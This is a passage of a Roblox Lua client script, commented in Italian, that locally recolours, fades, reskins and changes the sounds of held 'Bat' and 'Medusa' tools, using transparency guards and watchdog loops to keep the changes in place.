        s.Thickness = th or 1
        s.Transparency = tr or 0.4
        s.Parent = o
        return s
    end
    local function tween(o, props, t)
        return TweenService:Create(o, TweenInfo.new(t or 0.15), props):Play()
    end

    function _G._AmbitiousWaitCharReady(character, timeout)
        character = character or LP.Character
        if not character then return false end
        local deadline = os.clock() + (tonumber(timeout) or 5)
        while os.clock() < deadline do
            if not character.Parent then return false end
            if LP.Character and LP.Character ~= character then return false end
            if character:FindFirstChild("Head")
               and character:FindFirstChild("HumanoidRootPart")
               and character:FindFirstChildOfClass("Humanoid") then
                return true
            end
            task.wait(0.05)
        end
        return false
    end

    -- ============================================================
    -- CUSTOM TOOLS ENGINE (Rainbow / Transparent / Custom)
    -- ============================================================
    do
        local _Players    = game:GetService("Players")
        local _RunService = game:GetService("RunService")
        local _LP         = _Players.LocalPlayer

        -- Item riconosciuti (Bat / Slap Bat / Medusa's Head)
        local CT_ITEMS = {
            { key = "Bat",    match = function(n) n = n:lower() return n:find("bat") ~= nil or n:find("slap") ~= nil end },
            { key = "Medusa", match = function(n) return n:lower():find("medusa") ~= nil end },
        }

        local function ctMatchItem(inst)
            if not (inst:IsA("Tool") or inst:IsA("Model") or inst:IsA("Accessory") or inst:IsA("BasePart")) then
                return nil
            end
            for _, item in ipairs(CT_ITEMS) do
                if item.match(inst.Name) then return item end
            end
            return nil
        end

        local function isReplicaStuff(d)
            if d.Name == "LocalReplica" then return true end
            return d:FindFirstAncestor("LocalReplica") ~= nil
        end

        -- ------------------------------------------------------------
        -- GESTORE TRASPARENZA CONDIVISO
        -- Evita che Transparent e Custom Tools si sovrascrivano a vicenda.
        -- Ogni modulo "prenota" un valore, vince la priorita' piu' alta,
        -- e il valore originale vero viene letto una sola volta (baseline).
        -- ------------------------------------------------------------
        local CT_Trans = {}
        do
            local PRIORITY = { "custom", "rainbow", "transparent" }
            local baseline = setmetatable({}, { __mode = "k" })
            local claims   = setmetatable({}, { __mode = "k" })
            -- Connessioni GetPropertyChangedSignal("Transparency") per parte:
            -- servono a rimettere subito il valore se il gioco lo sovrascrive
            -- (e' il motivo per cui la bat originale ricompariva sopra la custom).
            local guards   = setmetatable({}, { __mode = "k" })

            function CT_Trans.getBaseline(part)
                local b = baseline[part]
                if b ~= nil then return b end
                local ok, val = pcall(function() return part.Transparency end)
                if not ok then return nil end
                baseline[part] = val
                return val
            end

            local function wantedValue(part)
                local c = claims[part]
                if not c then return nil end
                for _, who in ipairs(PRIORITY) do
                    if c[who] ~= nil then return c[who] end
                end
                return nil
            end

            -- Scrive solo se il valore e' davvero diverso: il watchdog dei
            -- Custom Tools richiama claim() sulle stesse parti ogni 0.4s e
            -- senza questo controllo sarebbero centinaia di property write
            -- inutili al secondo.
            local function setIfDifferent(part, v)
                local ok, cur = pcall(function() return part.Transparency end)
                if ok and cur ~= nil and math.abs(cur - v) <= 0.001 then return end
                pcall(function() part.Transparency = v end)
            end

            local function resolve(part)
                local v = wantedValue(part)
                if v ~= nil then
                    setIfDifferent(part, v)
                    return
                end
                local b = baseline[part]
                if b ~= nil then
                    setIfDifferent(part, b)
                end
            end

            -- Riapplica subito il valore prenotato se qualcun altro lo cambia.
            local function armGuard(part)
                if guards[part] then return end
                local ok, conn = pcall(function()
                    return part:GetPropertyChangedSignal("Transparency"):Connect(function()
                        local v = wantedValue(part)
                        if v == nil then return end
                        local ok2, cur = pcall(function() return part.Transparency end)
                        if ok2 and cur ~= nil and math.abs(cur - v) > 0.001 then
                            pcall(function() part.Transparency = v end)
                        end
                    end)
                end)
                if ok and conn then guards[part] = conn end
            end

            local function disarmGuard(part)
                local conn = guards[part]
                if conn then
                    pcall(function() conn:Disconnect() end)
                    guards[part] = nil
                end
            end

            -- Rete di sicurezza: se un evento e' andato perso (o la parte e'
            -- stata sostituita) il sweep periodico rimette tutto a posto.
            function CT_Trans.enforce()
                for part, _ in pairs(claims) do
                    if part.Parent then
                        local v = wantedValue(part)
                        if v ~= nil then
                            local ok, cur = pcall(function() return part.Transparency end)
                            if ok and cur ~= nil and math.abs(cur - v) > 0.001 then
                                pcall(function() part.Transparency = v end)
                            end
                        end
                    end
                end
            end

            function CT_Trans.claim(part, who, value)
                if not part then return end
                if CT_Trans.getBaseline(part) == nil then return end
                local c = claims[part]
                if not c then c = {}; claims[part] = c end
                c[who] = value
                armGuard(part)
                resolve(part)
            end

            function CT_Trans.release(part, who)
                if not part then return end
                local c = claims[part]
                if not c then return end
                c[who] = nil
                if next(c) == nil then
                    claims[part] = nil
                    disarmGuard(part)
                end
                if part.Parent then resolve(part) end
            end
        end

        -- ------------------------------------------------------------
        -- JANITOR: ogni 10s scarta le entry di oggetti non piu' esistenti,
        -- cosi' le tabelle non crescono in sessioni molto lunghe.
        -- ------------------------------------------------------------
        local CT_JANITORS = {}
        task.spawn(function()
            while true do
                task.wait(10)
                for _, fn in ipairs(CT_JANITORS) do pcall(fn) end
            end
        end)

        -- Sweep trasparenze: 4 volte al secondo rimette i valori prenotati.
        -- Gira solo se almeno uno dei tre moduli e' acceso.
        task.spawn(function()
            while true do
                task.wait(0.25)
                if _G.AmbitiousCustomToolsEnabled == true
                or _G.AmbitiousTransparentToolsEnabled == true
                or _G.AmbitiousRainbowToolsEnabled == true then
                    pcall(CT_Trans.enforce)
                end
            end
        end)

        -- ############################################################
        -- ##                     RAINBOW TOOLS                      ##
        -- ############################################################
        do
            local SPEED       = 0.35
            local SPREAD      = 0.035
            local UPDATE_STEP = 1 / 40

            local enabled  = false
            local tracked  = setmetatable({}, { __mode = "k" })
            local watchers = setmetatable({}, { __mode = "k" })
            local unregister

            local function classify(d)
                if d:IsA("MeshPart") then
                    return { obj = d, kind = "part", props = { "Color", "Material", "TextureID" }, clearTexture = "TextureID" }
                elseif d:IsA("BasePart") then
                    return { obj = d, kind = "part", props = { "Color", "Material" } }
                elseif d:IsA("SurfaceAppearance") then
                    return { obj = d, kind = "surface", props = { "Parent" } }
                elseif d:IsA("Decal") or d:IsA("Texture") then
                    return { obj = d, kind = "decal", props = {} }
                elseif d:IsA("SpecialMesh") then
                    return { obj = d, kind = "vector", prop = "VertexColor", props = { "VertexColor", "TextureId" }, clearTexture = "TextureId" }
                elseif d:IsA("ParticleEmitter") or d:IsA("Beam") or d:IsA("Trail") then
                    return { obj = d, kind = "sequence", prop = "Color", props = { "Color" } }
                elseif d:IsA("PointLight") or d:IsA("SpotLight") or d:IsA("SurfaceLight") then
                    return { obj = d, kind = "color", prop = "Color", props = { "Color" } }
                elseif d:IsA("Highlight") then
                    return { obj = d, kind = "color", prop = "FillColor", props = { "FillColor" } }
                end
                return nil
            end

            local function snapshot(node)
                node.original = {}
                for _, prop in ipairs(node.props) do
                    local ok, val = pcall(function() return node.obj[prop] end)
                    if ok then node.original[prop] = val end
                end
            end

            local function restoreNode(node)
                if node.kind == "decal" then CT_Trans.release(node.obj, "rainbow") end
                if not node.original then return end
                for prop, val in pairs(node.original) do
                    pcall(function() node.obj[prop] = val end)
                end
            end

            local function applyOnce(node)
                if node.kind == "surface" then
                    pcall(function() node.obj.Parent = nil end)
                elseif node.kind == "decal" then
                    CT_Trans.claim(node.obj, "rainbow", 1)
                elseif node.clearTexture then
                    pcall(function() node.obj[node.clearTexture] = "" end)
                end
            end

            local function addNode(entry, d)
                local node = classify(d)
                if not node then return end
                snapshot(node)
                applyOnce(node)
                if node.kind == "part" then
                    table.insert(entry.parts, node)
                elseif node.kind == "surface" or node.kind == "decal" then
                    table.insert(entry.statics, node)
                else
                    table.insert(entry.effects, node)
                end
            end

            local function register(root)
                if tracked[root] then return end
                local entry = { parts = {}, effects = {}, statics = {}, conns = {} }
                tracked[root] = entry

                for _, d in ipairs(root:GetDescendants()) do addNode(entry, d) end
                if root:IsA("BasePart") then addNode(entry, root) end

                table.insert(entry.conns, root.DescendantAdded:Connect(function(d)
                    addNode(entry, d)
                end))
                table.insert(entry.conns, root.AncestryChanged:Connect(function(_, parent)
                    if not parent then unregister(root, false) end
                end))
            end

            function unregister(root, doRestore)
                local entry = tracked[root]
                if not entry then return end
                for _, conn in ipairs(entry.conns) do pcall(function() conn:Disconnect() end) end
                if doRestore then
                    for _, node in ipairs(entry.parts)   do restoreNode(node) end
                    for _, node in ipairs(entry.effects) do restoreNode(node) end
                    for _, node in ipairs(entry.statics) do restoreNode(node) end
                end
                tracked[root] = nil
            end

            local function tryRegister(inst)
                if not enabled then return end
                if ctMatchItem(inst) then register(inst) end
            end

            local function unwatch(container)
                local conns = watchers[container]
                if not conns then return end
                for _, c in ipairs(conns) do pcall(function() c:Disconnect() end) end
                watchers[container] = nil
            end

            local function watch(container)
                if not container or watchers[container] then return end
                watchers[container] = { container.ChildAdded:Connect(tryRegister) }
                for _, child in ipairs(container:GetChildren()) do tryRegister(child) end
            end

            local function watchAll()
                watch(_LP:FindFirstChildOfClass("Backpack"))
                watch(_LP.Character)
            end

            _LP.ChildAdded:Connect(function(child)
                if enabled and child:IsA("Backpack") then watch(child) end
            end)

            _LP.CharacterAdded:Connect(function(char)
                for root in pairs(tracked) do unregister(root, false) end
                -- pulizia totale: il vecchio Character e il vecchio Backpack sono morti
                for container in pairs(watchers) do unwatch(container) end
                if not enabled then return end
                watch(char)
                task.defer(function()
                    if enabled then watchAll() end
                end)
            end)

            local acc = 0
            _RunService.Heartbeat:Connect(function(dt)
                if not enabled then return end
                if next(tracked) == nil then return end
                acc = acc + dt
                if acc < UPDATE_STEP then return end
                acc = 0

                local baseHue = (tick() * SPEED) % 1

                for _, entry in pairs(tracked) do
                    for i, node in ipairs(entry.parts) do
                        local part = node.obj
                        if part.Parent then
                            pcall(function()
                                part.Color = Color3.fromHSV((baseHue + (i - 1) * SPREAD) % 1, 1, 1)
                            end)
                        end
                    end
                    for i, node in ipairs(entry.effects) do
                        if node.obj.Parent then
                            local col = Color3.fromHSV((baseHue + (i - 1) * SPREAD) % 1, 1, 1)
                            if node.kind == "sequence" then
                                pcall(function() node.obj[node.prop] = ColorSequence.new(col) end)
                            elseif node.kind == "vector" then
                                pcall(function() node.obj[node.prop] = Vector3.new(col.R, col.G, col.B) end)
                            else
                                pcall(function() node.obj[node.prop] = col end)
                            end
                        end
                    end
                end
            end)

            table.insert(CT_JANITORS, function()
                for root in pairs(tracked) do
                    if not root.Parent then unregister(root, false) end
                end
                for container in pairs(watchers) do
                    if container ~= workspace and not container.Parent then unwatch(container) end
                end
            end)

            _G.AmbitiousRainbowTools = {
                setEnabled = function(on)
                    on = on and true or false
                    enabled = on
                    _G.AmbitiousRainbowToolsEnabled = on
                    if on then
                        watchAll()
                    else
                        for root in pairs(tracked) do unregister(root, true) end
                        for container in pairs(watchers) do unwatch(container) end
                    end
                end,
                isEnabled = function() return enabled end,
            }
        end

        -- ############################################################
        -- ##                   TRANSPARENT TOOLS                    ##
        -- ############################################################
        do
            local TRANSPARENCY = 0.5   -- 0 = opaco, 1 = invisibile

            local enabled  = false
            local tracked  = setmetatable({}, { __mode = "k" })
            local watchers = setmetatable({}, { __mode = "k" })
            local unregister

            local function canTouch(d)
                if not d:IsA("BasePart") then return false end
                -- non toccare le parti invisibili di default (baseline, non valore corrente)
                local base = CT_Trans.getBaseline(d)
                if base == nil or base >= 1 then return false end
                return true
            end

            local function addNode(entry, d)
                if not canTouch(d) then return end
                if entry.seen[d] then return end
                entry.seen[d] = true
                local node = { obj = d }
                table.insert(entry.parts, node)
                CT_Trans.claim(d, "transparent", TRANSPARENCY)
            end

            local function register(root)
                if tracked[root] then return end
                local entry = { parts = {}, seen = {}, conns = {} }
                tracked[root] = entry

                for _, d in ipairs(root:GetDescendants()) do addNode(entry, d) end
                if root:IsA("BasePart") then addNode(entry, root) end

                table.insert(entry.conns, root.DescendantAdded:Connect(function(d)
                    addNode(entry, d)
                end))
                table.insert(entry.conns, root.AncestryChanged:Connect(function(_, parent)
                    if not parent then unregister(root, false) end
                end))
            end

            function unregister(root, doRestore)
                local entry = tracked[root]
                if not entry then return end
                for _, conn in ipairs(entry.conns) do pcall(function() conn:Disconnect() end) end
                for _, node in ipairs(entry.parts) do
                    CT_Trans.release(node.obj, "transparent")
                end
                tracked[root] = nil
            end

            local function tryRegister(inst)
                if not enabled then return end
                if ctMatchItem(inst) then register(inst) end
            end

            local function unwatch(container)
                local conns = watchers[container]
                if not conns then return end
                for _, c in ipairs(conns) do pcall(function() c:Disconnect() end) end
                watchers[container] = nil
            end

            local function watch(container)
                if not container or watchers[container] then return end
                watchers[container] = { container.ChildAdded:Connect(tryRegister) }
                for _, child in ipairs(container:GetChildren()) do tryRegister(child) end
            end

            local function watchAll()
                watch(_LP:FindFirstChildOfClass("Backpack"))
                watch(_LP.Character)
            end

            _LP.ChildAdded:Connect(function(child)
                if enabled and child:IsA("Backpack") then watch(child) end
            end)

            _LP.CharacterAdded:Connect(function(char)
                for root in pairs(tracked) do unregister(root, false) end
                -- pulizia totale: il vecchio Character e il vecchio Backpack sono morti
                for container in pairs(watchers) do unwatch(container) end
                if not enabled then return end
                watch(char)
                task.defer(function()
                    if enabled then watchAll() end
                end)
            end)

            table.insert(CT_JANITORS, function()
                for root in pairs(tracked) do
                    if not root.Parent then unregister(root, false) end
                end
                for container in pairs(watchers) do
                    if not container.Parent then unwatch(container) end
                end
            end)

            _G.AmbitiousTransparentTools = {
                setEnabled = function(on)
                    on = on and true or false
                    enabled = on
                    _G.AmbitiousTransparentToolsEnabled = on
                    if on then
                        watchAll()
                    else
                        for root in pairs(tracked) do unregister(root, true) end
                        for container in pairs(watchers) do unwatch(container) end
                    end
                end,
                isEnabled = function() return enabled end,
            }
        end

        -- ############################################################
        -- ##                     CUSTOM TOOLS                       ##
        -- ## Bat -> Diamond Sword  Medusa's Head -> Golden Desert Eagle ##
        -- ############################################################
        do
            -- Catalogo skin. "cat" e' la categoria di oggetto su cui si applica.
            local ASSETS = {
                DiamondSword      = { cat = "Bat",    label = "Diamond Sword",
                                      mesh = "rbxassetid://8827558932", tex = "rbxassetid://8827558969",
                                      scale = Vector3.new(0.2, 0.2, 0.2),
                                      c0 = CFrame.new(-0.05, -0.1, -0.12) * CFrame.Angles(math.rad(90), math.rad(180), 300),
                                      -- view = distanza della camera nell'anteprima:
                                      -- piu' alta, piu' piccolo appare l'oggetto
                                      view = 4.9 },
                Katana            = { cat = "Bat",    label = "Katana",
                                      mesh = "rbxassetid://13528902482", tex = "rbxassetid://13528902373",
                                      scale = Vector3.new(1.4, 1.4, 1.4),
                                      c0 = CFrame.new(0, 0.6, 0) * CFrame.Angles(math.rad(270), math.rad(180), math.rad(180)),
                                      view = 6.6 },
                Skull             = { cat = "Medusa", label = "Skull",
                                      mesh = "rbxassetid://2050312704", tex = "rbxassetid://2050313393",
                                      scale = Vector3.new(1, 1, 1),
                                      c0 = CFrame.new(0, 0.65, -0.4) * CFrame.Angles(math.rad(330), 0, 0),
                                      view = 4.2 },
                GoldenDesertEagle = { cat = "Medusa", label = "Golden Desert Eagle",
                                      mesh = "rbxassetid://430251413", tex = "rbxassetid://435840335",
                                      scale = Vector3.new(0.01, 0.01, 0.01),
                                      c0 = CFrame.new(0, 0, -0.8) * CFrame.Angles(math.rad(330), math.rad(180), 0),
                                      view = 3.0 },
            }
            _G.AmbitiousCustomToolAssets = ASSETS

            -- Skin attualmente scelta per ogni categoria.
            -- Le skin salvate vanno lette QUI: questo blocco gira prima di
            -- loadConfig(), quindi affidarsi solo a lui azzererebbe la scelta
            -- ad ogni rejoin.
            if type(_G.AmbitiousCustomToolSkins) ~= "table" then
                local restored = nil
                pcall(function()
                    if isfile and isfile("VynxPC.json") and readfile then
                        local okJson, decoded = pcall(function()
                            return game:GetService("HttpService"):JSONDecode(readfile("VynxPC.json"))
                        end)
                        if okJson and type(decoded) == "table"
                           and type(decoded.customToolSkins) == "table" then
                            restored = decoded.customToolSkins
                        end
                    end
                end)
                _G.AmbitiousCustomToolSkins = { Bat = "DiamondSword", Medusa = "GoldenDesertEagle" }
                if restored then
                    for k, v in pairs(restored) do
                        if type(v) == "string" then _G.AmbitiousCustomToolSkins[k] = v end
                    end
                end
            end

            local function skinFor(cat)
                local key = _G.AmbitiousCustomToolSkins[cat]
                if key and ASSETS[key] and ASSETS[key].cat == cat then return key end
                return (cat == "Bat") and "DiamondSword" or "GoldenDesertEagle"
            end

            local enabled       = false
            local tracked       = setmetatable({}, { __mode = "k" })  -- [tool] = { hidden, conns }
            local watchers      = setmetatable({}, { __mode = "k" })
            local pendingHandle = setmetatable({}, { __mode = "k" })  -- [tool] = conn
            local teardown

            local function buildReplica(handle, mode)
                local existing = handle:FindFirstChild("LocalReplica")
                if existing then existing:Destroy() end

                local data = ASSETS[mode] or ASSETS.DiamondSword

                local m = Instance.new("Model")
                m.Name = "LocalReplica"

                local p = Instance.new("Part")
                p.Name        = "MainPart"
                p.CanCollide  = false
                p.CanQuery    = false
                p.CanTouch    = false
                p.Massless    = true
                p.Size        = Vector3.new(1, 1, 1)
                p.Transparency= 0
                p.Anchored    = false
                p.Parent      = m

                local mesh = Instance.new("SpecialMesh")
                mesh.MeshType  = Enum.MeshType.FileMesh
                mesh.MeshId    = data.mesh
                mesh.TextureId = data.tex
                mesh.Parent    = p

                local w = Instance.new("Motor6D")
                w.Part0 = handle
                w.Part1 = p

                -- Scala e impugnatura vengono dal catalogo, non da un if per skin
                mesh.Scale = data.scale
                w.C0 = data.c0

                w.Parent = p
                m.Parent = handle
                return m
            end

            -- Nasconde (NON distrugge) solo la grafica: parti, decal e texture.
            -- Suoni, script e componenti di gioco restano intatti.
            -- Idempotente di proposito: il watchdog lo richiama sulle stesse
            -- parti per ri-prenotare la trasparenza se e' stata persa.
            local function hideNode(entry, d)
                if isReplicaStuff(d) then return end
                if d:IsA("BasePart") or d:IsA("Decal") or d:IsA("Texture") then
                    entry.hidden[d] = true
                    CT_Trans.claim(d, "custom", 1)
                end
            end

            local function setupTool(tool)
                if tracked[tool] then return end

                local handle = tool:FindFirstChild("Handle")
                if not handle then
                    if pendingHandle[tool] then return end
                    local c
                    c = tool.ChildAdded:Connect(function(child)
                        if child.Name == "Handle" then
                            pcall(function() c:Disconnect() end)
                            pendingHandle[tool] = nil
                            if enabled then setupTool(tool) end
                        end
                    end)
                    pendingHandle[tool] = c
                    return
                end

                local entry = { hidden = {}, conns = {} }
                tracked[tool] = entry

                for _, d in ipairs(tool:GetDescendants()) do hideNode(entry, d) end

                local item = ctMatchItem(tool)
                local mode = skinFor((item and item.key == "Bat") and "Bat" or "Medusa")
                entry.cat = (item and item.key == "Bat") and "Bat" or "Medusa"
                buildReplica(handle, mode)

                table.insert(entry.conns, tool.DescendantAdded:Connect(function(d)
                    task.defer(function()
                        if tracked[tool] then hideNode(entry, d) end
                    end)
                end))
                table.insert(entry.conns, tool.AncestryChanged:Connect(function(_, parent)
                    if not parent then teardown(tool, false) end
                end))
            end

            function teardown(tool, doRestore)
                local entry = tracked[tool]
                if not entry then return end
                for _, conn in ipairs(entry.conns) do pcall(function() conn:Disconnect() end) end

                local handle = tool:FindFirstChild("Handle")
                if handle then
                    local rep = handle:FindFirstChild("LocalReplica")
                    if rep then pcall(function() rep:Destroy() end) end
                end

                for obj in pairs(entry.hidden) do
                    CT_Trans.release(obj, "custom")
                end
                entry.hidden = {}
                tracked[tool] = nil
            end

            local function tryRegister(inst)
                if not enabled then return end
                if inst:IsA("Tool") and ctMatchItem(inst) then
                    setupTool(inst)
                end
            end

            local function unwatch(container)
                local conns = watchers[container]
                if not conns then return end
                for _, c in ipairs(conns) do pcall(function() c:Disconnect() end) end
                watchers[container] = nil
            end

            local function watch(container)
                if not container or watchers[container] then return end
                watchers[container] = { container.ChildAdded:Connect(tryRegister) }
                for _, child in ipairs(container:GetChildren()) do tryRegister(child) end
            end

            local function watchAll()
                watch(_LP:FindFirstChildOfClass("Backpack"))
                watch(_LP.Character)
            end

            _LP.ChildAdded:Connect(function(child)
                if enabled and child:IsA("Backpack") then watch(child) end
            end)

            _LP.CharacterAdded:Connect(function(char)
                for tool in pairs(tracked) do teardown(tool, false) end
                for _, c in pairs(pendingHandle) do pcall(function() c:Disconnect() end) end
                table.clear(pendingHandle)
                -- pulizia totale: il vecchio Character e il vecchio Backpack sono morti
                for container in pairs(watchers) do unwatch(container) end
                if not enabled then return end
                watch(char)
                task.defer(function()
                    if enabled then watchAll() end
                end)
            end)

            table.insert(CT_JANITORS, function()
                for tool in pairs(tracked) do
                    if not tool.Parent then teardown(tool, false) end
                end
                for tool, c in pairs(pendingHandle) do
                    if not tool.Parent then
                        pcall(function() c:Disconnect() end)
                        pendingHandle[tool] = nil
                    end
                end
                for container in pairs(watchers) do
                    if not container.Parent then unwatch(container) end
                end
            end)

            -- ------------------------------------------------------------
            -- WATCHDOG INTEGRITA'
            -- Copre i due bug segnalati:
            --  1) la replica custom sparisce e resta solo l'arma originale
            --     (tool ri-parentato, Handle sostituito, replica distrutta);
            --  2) l'arma originale ricompare sopra la replica
            --     (trasparenza sovrascritta dal gioco -> ri-nascosta).
            -- ------------------------------------------------------------
            local function rebuildIfNeeded(tool, entry, deep)
                local handle = tool:FindFirstChild("Handle")
                if not handle then return end
                local rep      = handle:FindFirstChild("LocalReplica")
                local mainPart = rep and rep:FindFirstChild("MainPart")
                local motor    = mainPart and mainPart:FindFirstChildOfClass("Motor6D")
                local broken   = (not rep) or (not mainPart) or (not motor) or motor.Part0 ~= handle
                if broken then
                    local item = ctMatchItem(tool)
                    buildReplica(handle, skinFor((item and item.key == "Bat") and "Bat" or "Medusa"))
                end
                -- Ripassata completa solo se la replica era rotta o su richiesta
                if broken or deep then
                    for _, d in ipairs(tool:GetDescendants()) do hideNode(entry, d) end
                end
            end

            -- deep = ripassa anche tutti i descendant dei tool (piu' costoso).
            -- Il giro leggero controlla solo che la replica esista: la
            -- trasparenza e' gia' coperta dai guard + sweep di CT_Trans.
            local function integrityPass(deep)
                if not enabled then return end
                -- ri-aggancia i container (Backpack ricreato, respawn, ecc.)
                watchAll()
                local bp = _LP:FindFirstChildOfClass("Backpack")
                if bp then for _, ch in ipairs(bp:GetChildren()) do tryRegister(ch) end end
                local chr = _LP.Character
                if chr then for _, ch in ipairs(chr:GetChildren()) do tryRegister(ch) end end
                for tool, entry in pairs(tracked) do
                    if not tool.Parent then
                        teardown(tool, false)
                    else
                        rebuildIfNeeded(tool, entry, deep)
                    end
                end
            end

            _G.AmbitiousCustomToolsRecheck = function() pcall(integrityPass, true) end

            -- Cambio skin: aggiorna la scelta e ricostruisce subito le repliche
            -- gia' agganciate, senza dover spegnere e riaccendere il modulo.
            _G.AmbitiousSetCustomToolSkin = function(cat, key)
                if not ASSETS[key] or ASSETS[key].cat ~= cat then return end
                _G.AmbitiousCustomToolSkins[cat] = key
                for tool, entry in pairs(tracked) do
                    if tool.Parent and entry.cat == cat then
                        local handle = tool:FindFirstChild("Handle")
                        if handle then pcall(buildReplica, handle, key) end
                    end
                end
                if saveAmbitiousConfig then pcall(saveAmbitiousConfig) end
            end

            task.spawn(function()
                local n = 0
                while true do
                    task.wait(0.4)
                    if enabled then
                        n = n + 1
                        pcall(integrityPass, (n % 5) == 0)   -- deep ogni 2s
                    end
                end
            end)

            -- Riapplica subito quando equipaggi/sganci un'arma, senza aspettare
            -- il giro del watchdog.
            _LP.CharacterAdded:Connect(function()
                task.delay(0.6, function() if enabled then pcall(integrityPass, true) end end)
            end)

            _G.AmbitiousCustomTools = {
                setEnabled = function(on)
                    on = on and true or false
                    enabled = on
                    _G.AmbitiousCustomToolsEnabled = on
                    if on then
                        watchAll()
                        pcall(integrityPass, true)
                    else
                        for tool in pairs(tracked) do teardown(tool, true) end
                        for _, c in pairs(pendingHandle) do pcall(function() c:Disconnect() end) end
                        table.clear(pendingHandle)
                        for container in pairs(watchers) do unwatch(container) end
                    end
                end,
                isEnabled = function() return enabled end,
            }
        end

        -- ############################################################
        -- ##                    CUSTOM SOUNDS                       ##
        -- ##   Bat -> katana slash      Medusa -> gunshot           ##
        -- ##   Indipendente da Custom Tools: funziona anche da solo ##
        -- ############################################################
        do
            local SOUNDS = {
                Bat    = { id = "rbxassetid://5713085119", skip = 0.2 },
                Medusa = { id = "rbxassetid://3102797479", doublePlay = true, delay = 0.5 },
            }

            -- Un Sound puo' essere agganciato UNA volta sola: senza questo le
            -- connessioni si accumulavano a ogni re-equip (memory leak).
            local hooked = setmetatable({}, { __mode = "k" })

            local enabled       = false
            local tracked       = setmetatable({}, { __mode = "k" })  -- [tool] = { sound, data, conns, muted }
            local watchers      = setmetatable({}, { __mode = "k" })
            local pendingHandle = setmetatable({}, { __mode = "k" })
            local teardown

            local function playCustom(entry)
                local cs = entry.sound
                if not cs or not cs.Parent then return end
                local d = entry.data

                -- cancella un eventuale secondo colpo ancora in coda
                if entry.timer then
                    pcall(task.cancel, entry.timer)
                    entry.timer = nil
                end

                pcall(function()
                    cs:Stop()
                    cs.TimePosition = d.skip or 0
                    cs.Volume = 1
                    cs:Play()
                end)

                if d.doublePlay and d.delay then
                    entry.timer = task.delay(d.delay, function()
                        entry.timer = nil
                        if not enabled then return end
                        if cs and cs.Parent then
                            pcall(function()
                                cs:Stop()
                                cs.TimePosition = d.skip or 0
                                cs.Volume = 1
                                cs:Play()
                            end)
                        end
                    end)
                end
            end

            -- Silenzia il suono originale e fa partire quello custom
            local function hookSound(entry, snd)
                if not snd:IsA("Sound") then return end
                if snd.Name == "CustomSound" then return end
                if hooked[snd] then return end          -- gia' agganciato: niente doppioni
                if entry.muted[snd] ~= nil then return end

                entry.muted[snd] = snd.Volume
                hooked[snd] = true

                local function trigger()
                    if not enabled then return end
                    if snd.Playing or snd.TimePosition > 0 then
                        pcall(function()
                            snd.Volume = 0
                            snd:Stop()
                        end)
                        playCustom(entry)
                    end
                end

                local c1 = snd:GetPropertyChangedSignal("Playing"):Connect(trigger)
                local c2 = snd:GetPropertyChangedSignal("TimePosition"):Connect(trigger)
                table.insert(entry.conns, c1)
                table.insert(entry.conns, c2)

                -- il Sound viene distrutto: si liberano subito le connessioni
                local c3
                c3 = snd.AncestryChanged:Connect(function(_, parent)
                    if parent then return end
                    pcall(function() c1:Disconnect() end)
                    pcall(function() c2:Disconnect() end)
                    pcall(function() c3:Disconnect() end)
                    hooked[snd] = nil
                    entry.muted[snd] = nil
                    if entry.timer then
                        pcall(task.cancel, entry.timer)
                        entry.timer = nil
                    end
                end)
                table.insert(entry.conns, c3)

                if snd.Playing then trigger() end
            end

            local function setupTool(tool)
                if tracked[tool] then return end

                local item = ctMatchItem(tool)
                if not item then return end
                local data = SOUNDS[item.key]
                if not data then return end

                local handle = tool:FindFirstChild("Handle")
                if not handle then
                    if pendingHandle[tool] then return end
                    local c
                    c = tool.ChildAdded:Connect(function(child)
                        if child.Name == "Handle" then
                            pcall(function() c:Disconnect() end)
                            pendingHandle[tool] = nil
                            if enabled then setupTool(tool) end
                        end
                    end)
                    pendingHandle[tool] = c
                    return
                end

                local old = handle:FindFirstChild("CustomSound")
                if old then pcall(function() old:Destroy() end) end

                local cs = Instance.new("Sound")
                cs.Name        = "CustomSound"
                cs.SoundId     = data.id
                cs.Volume      = 1
                cs.Looped      = false
                cs.RollOffMode = Enum.RollOffMode.Inverse
                cs.MaxDistance = 1000
                cs.MinDistance = 1000
                cs.Parent      = handle

                local entry = { sound = cs, data = data, conns = {}, muted = {} }
                tracked[tool] = entry

                for _, d in ipairs(tool:GetDescendants()) do hookSound(entry, d) end

                table.insert(entry.conns, tool.DescendantAdded:Connect(function(d)
                    if tracked[tool] then hookSound(entry, d) end
                end))
                table.insert(entry.conns, tool.AncestryChanged:Connect(function(_, parent)
                    if not parent then teardown(tool) end
                end))
            end

            function teardown(tool)
                local entry = tracked[tool]
                if not entry then return end
                if entry.timer then
                    pcall(task.cancel, entry.timer)
                    entry.timer = nil
                end
                for _, conn in ipairs(entry.conns) do pcall(function() conn:Disconnect() end) end
                if entry.sound then pcall(function() entry.sound:Destroy() end) end
                for snd, vol in pairs(entry.muted) do
                    hooked[snd] = nil
                    if snd and snd.Parent then pcall(function() snd.Volume = vol end) end
                end
                tracked[tool] = nil
            end

            local function tryRegister(inst)
                if not enabled then return end
                if inst:IsA("Tool") and ctMatchItem(inst) then setupTool(inst) end
            end

            local function unwatch(container)
                local conns = watchers[container]
                if not conns then return end
                for _, c in ipairs(conns) do pcall(function() c:Disconnect() end) end
                watchers[container] = nil
            end

            local function watch(container)
                if not container or watchers[container] then return end
                watchers[container] = { container.ChildAdded:Connect(tryRegister) }
                for _, child in ipairs(container:GetChildren()) do tryRegister(child) end
            end

            local function watchAll()
                watch(_LP:FindFirstChildOfClass("Backpack"))
                watch(_LP.Character)
            end

            _LP.ChildAdded:Connect(function(child)
                if enabled and child:IsA("Backpack") then watch(child) end
            end)

            _LP.CharacterAdded:Connect(function(char)
                for tool in pairs(tracked) do teardown(tool) end
                for _, c in pairs(pendingHandle) do pcall(function() c:Disconnect() end) end
                table.clear(pendingHandle)
                for container in pairs(watchers) do unwatch(container) end
                if not enabled then return end
                watch(char)
                task.defer(function()
                    if enabled then watchAll() end
                end)
            end)

            table.insert(CT_JANITORS, function()
                for tool in pairs(tracked) do
                    if not tool.Parent then teardown(tool) end
                end
                for tool, c in pairs(pendingHandle) do
                    if not tool.Parent then
                        pcall(function() c:Disconnect() end)
                        pendingHandle[tool] = nil
                    end
                end
                for container in pairs(watchers) do
                    if not container.Parent then unwatch(container) end
                end
            end)

            _G.AmbitiousCustomSounds = {
                setEnabled = function(on)
                    on = on and true or false
                    enabled = on
                    _G.AmbitiousCustomSoundsEnabled = on
                    if on then
                        watchAll()
                    else
                        for tool in pairs(tracked) do teardown(tool) end
                        for _, c in pairs(pendingHandle) do pcall(function() c:Disconnect() end) end
                        table.clear(pendingHandle)
